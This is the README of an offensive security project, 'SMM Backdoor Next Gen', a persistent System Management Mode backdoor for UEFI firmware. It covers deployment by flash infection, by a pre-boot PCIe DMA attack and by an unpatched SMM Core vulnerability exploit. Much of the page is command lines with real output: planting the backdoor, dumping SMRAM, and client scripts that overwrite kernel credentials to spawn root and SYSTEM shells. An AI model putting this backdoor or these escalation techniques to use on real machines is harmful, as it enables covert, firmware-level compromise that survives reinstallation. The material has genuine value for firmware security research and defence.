
# SMM Backdoor Next Gen

## General Information

This version of System Management Mode backdoor for UEFI based platforms was heavily inspired by [my previous project](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html) (check [its GitHub repository](https://github.com/Cr4sh/SmmBackdoor)) but introducing few key changes in order to make it more up to date:

 * In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) (see [uefi_backdoor_simple.py](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) program usage for more details) and industry-wide EFI SMM Core [vulnerability exploitation](https://github.com/Cr4sh/SmmBackdoorNg/blob/main/src/exploit.c) to perform DXE to SMM execution transition. The vulnerability was discovered by myself and reported to Intel PSIRT years ago, but it still remains not patched on many products that using EDK2 derived firmware code, including whole [AMI Aptio](https://www.ami.com/aptio/) family.

 * Client program `smm_backdoor.py` supports Windows and Linux systems and can interact with SMM backdoor using SW SMI (requires high privileges and [chipsec](https://github.com/chipsec/chipsec) installed) or APIC periodic timer method that can work with any privileges level.

 * There's `smm_backdoor_privesc_linux.py` and `smm_backdoor_privesc_win.py` test client programs for SMM backdoor that demonstrating local privileges escalation under Windows and Linux by using its API provided by `smm_backdoor.py` library.

 * SMM backdoor is fully virtualization-aware now, its library and client programs can work as expected inside Windows or Linux virtual machines running on the infected host system.

## Backdoor Usage

Project documentation is incomplete at this moment, but here's some command line examples.

Deploying SMM backdoor using pre-boot DMA attack:

```
# python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
[+] Using UEFI system table hook injection method
[+] Reading DXE phase payload from SmmBackdoorNg_X64.efi
[+] Waiting for PCI-E link...
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Looking for DXE driver PE image...
[+] PE image is at 0x7a070000
[+] EFI_SYSTEM_TABLE is at 0x7a03e018
[+] EFI_BOOT_SERVICES is at 0x7a38fa30
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
Backdoor image size is 0x49a0
Backdoor entry RVA is 0x20fc
Planting DXE stage driver at 0xc0000...
Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c20fc
1.852231 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed
[+] DONE
```

Basic use of SMM backdoor `smm_backdoor.py` client program:

```
# python2 smm_backdoor.py --debug
****** Chipsec Linux Kernel module is licensed under GPL 2.0
[+] Obtaining backdoor debug information...
[+] Debug output buffer physical address is 0x79da4000

00000001 - backdoor.c(1573) : ******************************
00000002 - backdoor.c(1574) :
00000003 - backdoor.c(1575) :   SMM backdoor loaded
00000004 - backdoor.c(1576) :
00000005 - backdoor.c(1577) : ******************************
00000006 - backdoor.c(1589) : Resident code base address is 0x79d9f000
00000007 - backdoor.c(1502) : BackdoorResidentDma()
00000008 - backdoor.c(313) : Protocol notify handler is at 0x79d9f364
00000009 - backdoor.c(1423) : SMM access 2 protocol is at 0x778fe650
00000010 - backdoor.c(1424) : Available SMRAM regions:
00000011 - backdoor.c(1434) :  * 0x7b000000:0x7b000fff
00000012 - backdoor.c(1434) :  * 0x7b001000:0x7b7fffff
00000013 - exploit.c(242) : SMM communicate header is at 0x79da2ae0
00000014 - exploit.c(256) : Executing SMM callback...
00000015 - backdoor.c(1215) : Running in SMM
00000016 - backdoor.c(1216) : SMM system table is at 0x7b7f84c0
00000017 - backdoor.c(1177) : Max. SW SMI value is 0xff
00000018 - backdoor.c(1188) : SW SMI handler is at 0x7b5effb8
00000019 - exploit.c(271) : Communicate(): status = 0xe, size = 0x19
00000020 - exploit.c(277) : Exploit(): Exploitation success
00000021 - backdoor.c(409) : SmmCtlHandle(): Periodic timer SW SMI was enabled
00000022 - backdoor.c(1328) : new_SetVirtualAddressMap()
00000023 - backdoor.c(1369) : New address of the resident image is 0xfffffffeec79f000
```
```
# python2 smm_backdoor.py --use-timer --test
[+] Checking if SMM backdoor is present...
[+] Obtaining information...

  CR0 = 0x80000033
  CR3 = 0x7b7b1000
 SMST = 0x7b7f84c0

[+] SMRAM regions:

 * 0x7b000000:7b000fff
 * 0x7b001000:7b7fffff
```
```
# python2 smm_backdoor.py --use-timer --read-phys 0x7b000000 --size 0x80
7b000000: 53 4d 4d 53 33 5f 36 34 90 c5 7d 7b 00 00 00 00 | SMMS3.64........
7b000010: 00 60 7a 7b 00 00 00 00 00 80 00 00 00 00 00 00 | ..z.............
7b000020: 33 00 00 80 00 00 00 00 00 10 7b 7b 00 00 00 00 | 3...............
7b000030: 68 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............
7b000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
7b000050: 00 00 00 00 00 00 00 00 00 00 c0 84 7f 7b 00 00 | ................
7b000060: 00 00 e1 13 e0 12 e0 12 f0 12 e1 13 f1 03 f1 03 | ................
7b000070: f1 02 e1 13 e0 12 e0 12 e0 02 e1 13 f1 03 f1 03 | ................
```
```
# python2 smm_backdoor.py --dump-smram
****** Chipsec Linux Kernel module is licensed under GPL 2.0
[+] Dumping SMRAM regions, this may take a while...
[+] Creating SMRAM_dump_7b000000_7b7fffff.bin
```

Example of `smm_backdoor_privesc_linux.py` client program usage:

```
$ python2 smm_backdoor_privesc_linux.py
[+] Initializing SMM backdoor client...
[+] User CR3 = 0x271b14000
[+] LSTAR = 0xffffffff81e00010
[+] do_syscall_64() is at 0xffffffff810025c0
[+] sys_call_table() is at 0xffffffff822001a0
[+] sys_getuid() is at 0xffffffff81073c10
[+] task_struct offset is 0x14d40
[+] cred offset is 0x628
[+] IA32_KERNEL_GS_BASE = 0xffff888277a00000
[+] Process task_struct is at 0xffff88827148db00
[+] Process cred is at 0xffff88827289d000
[+] Overwriting process credentials...
[+] Done, spawning root shell...

sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video)
```

Example of `smm_backdoor_privesc_win.py` client program usage:

```
PS C:\> python2 smm_backdoor_privesc_win.py
[+] Initializing SMM backdoor client...
[+] NT version is 10.0.19041
[+] _EPROCESS Token offset is 0x04b8
[+] _KPCR KernelDirectoryTableBase offset is 0x9000
[+] _KPCR structure is at 0xfffff8005f486000
[+] KVA shadow is disabled or not present
[+] Kernel CR3 value is 0x0000000141491000
[+] Token object address is 0xffffcd0ef752c060
[+] Present privileges: 0x1e73deff20 -> 0x1ff2ffffbc
[+] Enabled privileges: 0x60900000 -> 0x1ff2ffffbc
[+] Current process object address is 0xffffa60de954a080
[+] System process object address is 0xffffa60de12dd080
[+] Overwriting process token...
[+] Done, spawning SYSTEM shell...

Microsoft Windows [Version 10.0.19041.208]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\> whoami
nt authority\system
```

## About

Developed by:<br />
Dmytro Oleksiuk (aka Cr4sh)

[cr4sh0@gmail.com](mailto:cr4sh0@gmail.com)<br />
[http://blog.cr4.sh](http://blog.cr4.sh)
